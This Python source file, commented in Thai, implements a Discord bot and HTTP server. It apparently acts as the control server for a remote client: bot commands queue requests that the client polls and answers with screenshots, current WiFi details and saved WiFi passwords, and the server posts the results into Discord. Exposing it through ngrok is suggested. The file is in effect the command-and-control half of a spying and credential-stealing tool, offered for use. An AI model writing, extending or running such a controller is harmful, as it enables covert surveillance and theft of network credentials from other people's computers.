"""
Discord Bot Server (รันบน PC1)
- !cap       -> ขอ screenshot จาก client ส่งกลับเป็นไฟล์รูป
- !wifi      -> ขอข้อมูล WiFi ปัจจุบัน ส่งกลับเป็น embed
- !wifi-pass -> ขอรหัส WiFi ที่เคยเชื่อมต่อ ส่งกลับเป็น embed
- !ping      -> เช็คสถานะ bot
"""

import asyncio
import io
import os
import socket
import time
from collections import defaultdict

import discord
from aiohttp import web
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
HTTP_PORT = int(os.getenv("HTTP_PORT", 8765))
API_SECRET = os.getenv("API_SECRET", "my-secret-key")

# ==================== State ====================
pending: dict[int, asyncio.Future] = {}
pending_type: dict[int, str] = {}
pending_started: dict[int, float] = {}

_rate: dict[str, list[float]] = defaultdict(list)
START_TIME = time.time()


def rate_ok(ip: str, path: str = "/", limit: int = 30, window: float = 60.0) -> bool:
    """Rate limit แยกตาม (ip, path)"""
    key = f"{ip}|{path}"
    now = time.time()
    _rate[key] = [t for t in _rate[key] if now - t < window]
    if len(_rate[key]) >= limit:
        return False
    _rate[key].append(now)
    return True


# ==================== Discord Bot ====================
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    print(f"[BOT] Logged in as {bot.user} (ID: {bot.user.id})")
    print(f"[BOT] Commands: !cap, !wifi, !wifi-pass, !ping")


async def wait_for_client(
    channel: discord.abc.Messageable, cmd_type: str, timeout: float = 60.0
) -> dict | None:
    """รอ client ส่งข้อมูลกลับภายใน timeout"""
    channel_id = channel.id

    old = pending.get(channel_id)
    if old and not old.done():
        old.cancel()

    loop = asyncio.get_event_loop()
    fut = loop.create_future()
    pending[channel_id] = fut
    pending_type[channel_id] = cmd_type
    pending_started[channel_id] = time.time()

    try:
        data = await asyncio.wait_for(fut, timeout=timeout)
        return data
    except asyncio.TimeoutError:
        return None
    finally:
        pending.pop(channel_id, None)
        pending_type.pop(channel_id, None)
        pending_started.pop(channel_id, None)


# ==================== Commands ====================

@bot.command(name="cap")
async def cap_cmd(ctx: commands.Context):
    """!cap -> ขอ screenshot จาก client"""
    await ctx.send("📸 กำลังขอภาพหน้าจอจาก client...")
    data = await wait_for_client(ctx.channel, "cap", timeout=60.0)

    if data is None:
        await ctx.send("⏰ หมดเวลา — client ไม่ตอบกลับ (60s)")
        return

    image_bytes = data.get("image")
    if not image_bytes:
        await ctx.send("❌ ได้รับข้อมูลแต่ไม่มีรูปภาพ")
        return

    file = discord.File(io.BytesIO(image_bytes), filename="screenshot.png")
    await ctx.send("✅ ภาพหน้าจอ:", file=file)


@bot.command(name="wifi")
async def wifi_cmd(ctx: commands.Context):
    """!wifi -> ขอข้อมูล WiFi ปัจจุบัน"""
    await ctx.send("📶 กำลังขอข้อมูล WiFi จาก client...")
    data = await wait_for_client(ctx.channel, "wifi", timeout=60.0)

    if data is None:
        await ctx.send("⏰ หมดเวลา — client ไม่ตอบกลับ (60s)")
        return

    text = data.get("text", "").strip()
    if not text:
        await ctx.send("❌ ได้รับข้อมูลแต่ไม่มีเนื้อหา")
        return

    CHUNK = 3900
    chunks = [text[i:i + CHUNK] for i in range(0, len(text), CHUNK)]

    for idx, chunk in enumerate(chunks, 1):
        embed = discord.Embed(
            title=f"📶 WiFi Information ({idx}/{len(chunks)})",
            description=f"```\n{chunk}\n```",
            color=discord.Color.blue(),
            timestamp=discord.utils.utcnow(),
        )
        if idx == len(chunks):
            embed.set_footer(text=f"รวม {len(text)} chars")
        await ctx.send(embed=embed)


@bot.command(name="wifi-pass")
async def wifi_pass_cmd(ctx: commands.Context):
    """!wifi-pass -> ขอรหัส WiFi ที่เคยเชื่อมต่อ"""
    await ctx.send("🔐 กำลังขอรหัส WiFi จาก client... (อาจใช้เวลาสักครู่)")
    data = await wait_for_client(ctx.channel, "wifi-pass", timeout=90.0)

    if data is None:
        await ctx.send("⏰ หมดเวลา — client ไม่ตอบกลับ (90s)")
        return

    text = data.get("text", "").strip()
    if not text:
        await ctx.send("❌ ได้รับข้อมูลแต่ไม่มีเนื้อหา")
        return

    CHUNK = 3900
    chunks = [text[i:i + CHUNK] for i in range(0, len(text), CHUNK)]

    for idx, chunk in enumerate(chunks, 1):
        embed = discord.Embed(
            title=f"🔐 WiFi Passwords ({idx}/{len(chunks)})",
            description=f"```\n{chunk}\n```",
            color=discord.Color.red(),
            timestamp=discord.utils.utcnow(),
        )
        if idx == len(chunks):
            embed.set_footer(text=f"รวม {len(text)} chars")
        await ctx.send(embed=embed)


@bot.command(name="ping")
async def ping_cmd(ctx: commands.Context):
    """!ping -> เช็คว่า bot ยังอยู่"""
    await ctx.send(f"🏓 pong! latency {round(bot.latency * 1000)}ms")


# ==================== HTTP Server ====================

@web.middleware
async def auth_middleware(request: web.Request, handler):
    """ตรวจ API key + rate limit แยกตาม path"""
    if request.path == "/health":
        return await handler(request)

    if request.headers.get("X-API-Key") != API_SECRET:
        return web.json_response({"error": "unauthorized"}, status=401)

    ip = request.remote or "unknown"

    if request.path == "/pending":
        if not rate_ok(ip, "/pending", limit=180, window=60.0):
            return web.json_response({"error": "rate limited (pending)"}, status=429)
        return await handler(request)

    if request.path == "/upload":
        if not rate_ok(ip, "/upload", limit=30, window=60.0):
            return web.json_response({"error": "rate limited (upload)"}, status=429)
        return await handler(request)

    if not rate_ok(ip, request.path, limit=60, window=60.0):
        return web.json_response({"error": "rate limited"}, status=429)

    return await handler(request)


async def handle_upload(request: web.Request) -> web.Response:
    """
    POST /upload (multipart/form-data)
        channel_id : int
        type       : "cap" | "wifi" | "wifi-pass"
        image      : file (ถ้า type=cap)
        text       : str  (ถ้า type=wifi หรือ wifi-pass)
    """
    # ✅ ตรวจ content-type
    ctype = request.headers.get("Content-Type", "")
    if "multipart/form-data" not in ctype:
        print(f"[UPLOAD] ❌ wrong content-type: {ctype}")
        return web.json_response(
            {"error": f"expected multipart/form-data, got {ctype}"},
            status=400,
        )

    reader = await request.multipart()
    fields: dict[str, bytes] = {}

    async for part in reader:
        if part.name is None:
            continue
        fields[part.name] = await part.read()

    try:
        channel_id = int(fields.get("channel_id", b"0").decode())
    except ValueError:
        return web.json_response({"error": "invalid channel_id"}, status=400)

    data_type = fields.get("type", b"").decode()

    fut = pending.get(channel_id)
    if fut is None or fut.done():
        return web.json_response({"error": "no pending request"}, status=404)

    if pending_type.get(channel_id) != data_type:
        return web.json_response(
            {"error": f"type mismatch (waiting for {pending_type.get(channel_id)})"},
            status=400,
        )

    if data_type == "cap":
        img = fields.get("image", b"")
        if not img:
            return web.json_response({"error": "missing image"}, status=400)
        payload = {"image": img}
    elif data_type in ("wifi", "wifi-pass"):
        payload = {
            "text": fields.get("text", b"").decode("utf-8", errors="replace")
        }
    else:
        return web.json_response({"error": "unknown type"}, status=400)

    try:
        fut.set_result(payload)
    except Exception as e:
        print(f"[UPLOAD] set_result error: {e}")
        return web.json_response({"error": "internal"}, status=500)

    return web.json_response({"status": "ok", "received": data_type})


async def handle_pending(request: web.Request) -> web.Response:
    """GET /pending -> client poll ว่ามีงานไหม"""
    for ch_id, typ in list(pending_type.items()):
        fut = pending.get(ch_id)
        if fut and not fut.done():
            return web.json_response(
                {
                    "has_task": True,
                    "channel_id": ch_id,
                    "type": typ,
                    "age": round(
                        time.time() - pending_started.get(ch_id, time.time()), 2
                    ),
                }
            )
    return web.json_response({"has_task": False})


async def handle_health(request: web.Request) -> web.Response:
    """GET /health -> เช็คสถานะ"""
    return web.json_response(
        {
            "status": "healthy",
            "bot": str(bot.user) if bot.user else None,
            "pending": len(pending),
            "uptime": round(time.time() - START_TIME, 1),
        }
    )


def create_http_app() -> web.Application:
    app = web.Application(client_max_size=20 * 1024 * 1024)  # 20 MB
    app.middlewares.append(auth_middleware)
    app.router.add_post("/upload", handle_upload)
    app.router.add_get("/pending", handle_pending)
    app.router.add_get("/health", handle_health)
    return app


# ==================== Utilities ====================

def get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


# ==================== Main ====================

async def main():
    if not BOT_TOKEN:
        print("[ERROR] BOT_TOKEN ไม่ถูกตั้งค่าใน .env")
        return

    app = create_http_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", HTTP_PORT)
    await site.start()

    print("=" * 60)
    print(f"[HTTP] Listening on 0.0.0.0:{HTTP_PORT}")
    print(f"[HTTP] Local  : http://127.0.0.1:{HTTP_PORT}")
    print(f"[HTTP] LAN    : http://{get_local_ip()}:{HTTP_PORT}")
    print(f"[HTTP] Health : http://{get_local_ip()}:{HTTP_PORT}/health")
    print("[HTTP] เปิด ngrok อีกหน้าต่าง: ngrok http 8765")
    print("=" * 60)

    try:
        await bot.start(BOT_TOKEN)
    finally:
        await runner.cleanup()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[BOT] Shutting down...")
